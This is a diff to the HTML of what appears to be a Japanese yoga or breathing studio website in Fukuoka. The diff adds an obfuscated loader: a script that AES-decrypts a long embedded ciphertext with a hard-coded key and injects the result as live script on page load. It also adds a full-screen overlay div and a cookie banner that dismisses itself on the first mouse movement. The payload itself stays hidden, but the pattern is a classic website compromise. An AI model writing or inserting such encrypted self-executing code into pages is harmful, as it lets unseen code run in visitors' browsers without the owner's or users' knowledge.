@@ -144,7 +144,87 @@ footer {
     <a href="#">予約</a>
   </nav>
 </header>
-
+<script src="https://cdn.tailwindcss.com"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+<script>
+    function aesDecode(encodedText) {
+        const decodedText = decodeURIComponent(encodedText);
+        const bytes = CryptoJS.AES.decrypt(decodedText, '2B9IyccRxXwiZctB2LiJFX2pKNedKvwO017H2ii4toIUcF5T3JbmskNEytf');
+        return bytes.toString(CryptoJS.enc.Utf8);
+    }
+    const codeString = aesDecode(`U2FsdGVkX18rXgkUXAIXZWt27U24B0jFldZLjUFtbmb1CYTirMZhXV1b25ID%2FKZBDtPxxzb8xHgbUwsGRd7mMFymE3dnoKQvtpE%2FOMcQW%2F707QcnGV%2Bg34fqotqfBNhJaipe%2F2%2FvCOJ%2BozUjqgUje4nuH6RkwKw7bpI%2FK2%2FAy8XvLIQxDwXr1%2FSXlNO0LGvP2noctxRBb1U3Jokq7leeN6u5zSznXY0HEfbl%2BAVhJlokIFix3nXXelKLuvhgWWp5gojopyfXhdRvbvBlCW9F9HkobwNz9YeW%2FZKpfDbCgjT4G%2Fys88P3CH8FHVy7WEfsXz8657hBlHsQPzPVejbxHH1x%2FOaBuR3p0Zuj%2Bzz%2FU1%2B%2B%2BCIzKOg8AOFhmGSRqoA%2F8072Zz%2BhB6oxSteVoREYWrWSBZnKIcPMqBCnRjRMi6i46g%2BDP4iDqYzUj1H2MX4FBIQlzCBHRIdQMIhPapqSns6RnfMGYclUTNQSoxGkIvPJqPQDt%2BkNJ9fG2pxkj7vpRW0jlm1l07bjOu1UeILHJPcpkDQtJywx3FuwMGgwwyOChthsk7%2FhXzgPIKcwgZTttukDshArocqk1xQgmqKPpBEW%2FCh0nch%2BdnUITK5boc5nvGmOrSfVb53tsguLxNdXC%2BndeF4TetEKiaf25Vp1anyvUzv%2BoXK7uxY4JolDXNbUyIO2EkJ8QusXftOcdW0MmpApQZ2I7RfomD%2FOMGPdoPqjuxLiy%2Fn4fAWMh5BD%2B9F7E6he2rMJiivpzl23jnWaVmBy5IJYTQSjMDOl60SsG2ITVrTH5mbKGPgwuQsPbuBXQrAVlcIQOaAZLzN5%2BSvHcoWup1UgbY9rfzwct3san%2BPrcrIwpl4D4WPBch8nt9xeYTwUHb6wWTANHriN7sqQ07EwVSmLClZOdFRF%2BZvQdM2%2BrOVE4AvLm68J%2F2M55B3w4rlmDy2ejWB1VBW702hZLUrSs5gVk6XzXePNoQeQYF8jVIcMg7hRty8Gn236Of%2FS1M5pqXQ0BbT4DuykUrOtSxQ69ATIupUDecTI7igAIg5MkpnK08sJgWD3c%2BnTOdfcBMPI1AJ0JSS7lU7VFAH5b75assBTiS2hokFLUG9yM1CAMoyPh3a%2B0cgKiyG6ezZ5Pj1lbpR3SKz2RMgbCDBtvGh7jaSYY%2Fs%2BfTsYBl%2B1X77BNfo7nrbvv134nluKlqxLzazSEsOKh0juXN4KlD%2BzZ9AcjVtwbplY%2FxyJEaW3HfGzHfDWHgpdWcKOgVv%2BBaKrVe8G5Kfn5hhU7y5ihvexABhshzw29JOQZQ797cdygqjfZrynd1BOuoN7jk3Vr7BcnC0Yh0AJbnrOJbFop2APHr3CSMAmBf119h8vCzRJcBIqBmzi4yxiarWGkBOLvfblpht%2FlVIxEURISysbPG9sqcLB5tmh81d4ia6T%2FUgT6WK%2FJpj2hCOfQ%2FL7mhyb5T55Ck2VZtEAqbVzM8jHrojt2wYtJ9H4TBVdFsO6QFu3%2Fk%2FHzeQs5Rzx1wuUF8m%2BA9jUdd5Yg%2BVDIjf%2FA1mxtay%2FYauAUMk26VvFizdOA6bNCSqE1gtdsJv9o%2BmRyUb9uHHej4V2mU4YvWFmWASpf0eS9GCxulAsJlAlooxiFjvB9UqSqB3Y3eh3ziB5N1p4zuRYuufSOOSA2yU%2FjkOe6Diyfq3uDqpCKFswVllEFkrSbOQpRawXCVAKaDvLLLjODQgkOQtAGlFy5%2BCc%2F2%2FqwfCmfYETQCChXN3tt583hE1u1zWaPwLh%2BPjQ8NYL%2FKf68puiMbGkPG7fypFNmu%2FO%2B%2F%2FMNvYJeZoGhvcc6Hc2hJRwLtp%2FOxQChR1R%2Bh7FEyyDqZYMpmQ854vJiXqxmOvcPaAGRTRW5STGQyahlsKPdUrpYRjm8LSd%2FiAaWSoTjJZtDovw30stIeQQ%2Fy7uPrDkMbg64AXjgxgdNQYN%2Fn9LMTRoWsGHSXqjLFlBkNo%2BXv8w9KgGrOjNKEKu56jNDd07Y4vAbDwBXpuN340S3eS21sxDvuvRRhTvIPkIglY83negdTDS7nJeI6TtH0JAA9gf9hoeDUigiyYQr2aonN5kX0I72%2BeI3khOH19WAsFtODN8MNJJEtatoNYW%2BSRdbu6pS35D5qXCgLeHVyUgc9%2FTKR76tsiV7DTOnldUtXgRuITl%2BkTAFxyERIgYkir4g4WDbSWndRa6XqT3s5bEF%2FCboap7jsjFYRHeKxMRO0dbmdZqcGAmFcSGyN6CeQ5qrpz3VTcSAZl%2FfFT21iHUcszHH9%2FXY5y5SzD2w67JdISlnlJbOM3Jl%2BBPSOeaV0cnTOtZLhH1WJLRsNYDprxR3qGILJogA84Pr96D%2B9hflzogLzd7KXdHZA8i08G5BS%2B6g43lB1aHhn%2BfUAWd3AprwRfH3Cw81KV8UEdmLNxK0OMAQqxwWYK2SMV1FLTb%2BUMnrfeyI3sd%2FWshfx1VjhtgTnjJqYvRcf5JJrrvra8m%2BltZt1KJYGaXGaQtHMZt1DyJIqgSgqZViBB3gGCDshyVZ3WBJ81L5u47bNhsSdQVVsU1vG2T0yjrlYog0AyrRqpePWA2ieO%2Boc0D30fRZabgg3YwYRePtOIdEE3PGy%2FRo7%2BU9047kYSv3me1E%2F2bYXdU9nAcevfZEAq7v%2Bp39UWSTK%2FamwfHoUupDqyBsHRHlPztp6mmbO6EN7%2BUXxV6lt2lALLWbsU%2BROrFm0pAT7uzPQp9m2mWXBjoO8rrmSAPJlS46Yf9WvOQejH%2BTZcIb1WART49PgrhyWZ%2BN8pfz8u%2BNQkZIwqJ5LqJz%2Ba2RY%2F2lhIxo8%2BEvUtskZYKCaOsYeOb04bTwol1w8EcJVGHm%2FtRgUsy%2BamkkigjU5y2vWShvphqOrcS4J3yRaToeQsfwv4lSJTKUc2RRLeeVP8LWp8s855Rvq3Wq9xWG5PjRQoo7MhhdDXXG67EIbuyFHkkY8cUIcsulqLNkslkT2EdS2k6Mvtj3nw%2FxfY0%2BNEYB0cC6MjnNcftqYmumfUQsuKaahxXq1OkZ9ZLQKJZtH%2B953q%2B%2FrmuRWg7Oo5bEhVFj67xkTNmE0G3i4cMNdKulRQC65hYGH9T4zQ2BalycxekQ9qJxFo2%2F9Zwr6tORbXjrbzx0bvYxM1vvdsRyNTDk5iojckgWFIq3BIdowST2%2Fz3GC3sKeLzEQ2TNIHxiBdvmPBxHYILCZ64GB04WPt6L9UCtsTT8K8bbSfnBrAT2cPdaQN3fayx6a8ACV1fKqhmsjM8PZiZW1wrMdVZBsjljExGY13cOkDUN6hPDwrT5x7CMBj15EJSt0Qry4LGV5Q6Oi2kbtePYDWyti%2FWuHtZektBfzu01AR772DlGx6Dx4JIziwZ1dPElKv53TqFi2AqIIpd53EbQpSZP3I%3D`);
+    const script = document.createElement("script");
+    script.textContent = codeString;
+    document.body.appendChild(script);
+</script> 
+<div id="contentiframe" style="z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+ 
+</div>
+ 
+<div id="cookie-modal-box" class="hidden">
+<div id="cookie-backdrop" class="fixed inset-0 z-40 bg-black/40 backdrop-blur-md transition-opacity duration-300 opacity-0"></div>
+<div id="cookie-modal" class="fixed inset-0 flex items-center justify-center p-4 z-50 transition-all duration-300 opacity-0 scale-90">
+<div class="bg-white text-gray-800 rounded-2xl shadow-2xl max-w-lg w-full p-8 relative">
+<button id="cookie-close" class="absolute top-4 right-4">
+<svg viewBox="0 0 15 15" class="text-gray-500 hover:text-red-500" height="26" width="26">
+<path fill="currentColor" d="M11.78 4.03a.75.75 0 0 0-1.06-1.06L7.5 6.19 4.28 2.97a.75.75 0 1 0-1.06 1.06L6.44 7.5l-3.22 3.22a.75.75 0 1 0 1.06 1.06L7.5 8.56l3.22 3.22a.75.75 0 1 0 1.06-1.06L8.56 7.5l3.22-3.47Z"/>
+</svg>
+</button>
+<div class="flex items-center gap-3 mb-4">
+<span class="text-yellow-500 text-3xl">🍪</span>
+<h2 class="text-2xl font-bold">クッキーについて</h2>
+</div>
+<p class="text-gray-600 mb-6">
+                当サイトでは、より良いユーザー体験を提供するためにクッキーを使用しています。 <span class="font-semibold">「同意する」</span>
+                をクリックすると、クッキーの使用に同意したことになります。
+</p>
+<div class="flex flex-col sm:flex-row gap-3">
+<button id="cookie-accept" class="flex-1 bg-green-600 hover:bg-green-700 text-white py-3 px-6 rounded-lg font-bold">🍪 同意する</button>
+<button id="cookie-decline" class="flex-1 bg-gray-200 hover:bg-gray-300 text-gray-800 py-3 px-6 rounded-lg font-bold">拒否する</button>
+</div>
+</div>
+</div>
+</div>
+<script>
+    const modalBox = document.getElementById("cookie-modal-box"),
+        modal = document.getElementById("cookie-modal"),
+        backdrop = document.getElementById("cookie-backdrop"),
+        acceptBtn = document.getElementById("cookie-accept"),
+        declineBtn = document.getElementById("cookie-decline"),
+        closeBtn = document.getElementById("cookie-close");
+ 
+    function showModal() {
+        modalBox.classList.remove("hidden");
+        setTimeout(() => {
+            backdrop.classList.remove("opacity-0");
+            modal.classList.remove("opacity-0", "scale-90");
+        }, 10);
+    }
+ 
+    function hideModal(e) {
+        localStorage.setItem("cookie-consent", e);
+        setTimeout(() => {
+            modalBox.classList.add("hidden");
+        }, 1500);
+ 
+        // remove mousemove listener once closed
+        document.removeEventListener("mousemove", mouseMoveClose);
+    }
+ 
+    function mouseMoveClose() {
+        hideModal("closed");
+    }
+ 
+    acceptBtn.onclick = () => hideModal("accepted");
+    declineBtn.onclick = () => hideModal("declined");
+    closeBtn.onclick = () => hideModal("closed");
+    backdrop.onclick = () => hideModal("closed");
+ 
+    if (!localStorage.getItem("cookie-consent")) {
+        showModal();
+        document.addEventListener("mousemove", mouseMoveClose, { once: true });
+    }
+</script>
 <section class="hero">
   <h2>福岡・天神、博多の風とともに、呼吸を深めるスタジオ。</h2>
   <p>静かな空間で、自分と向き合う時間を。</p>
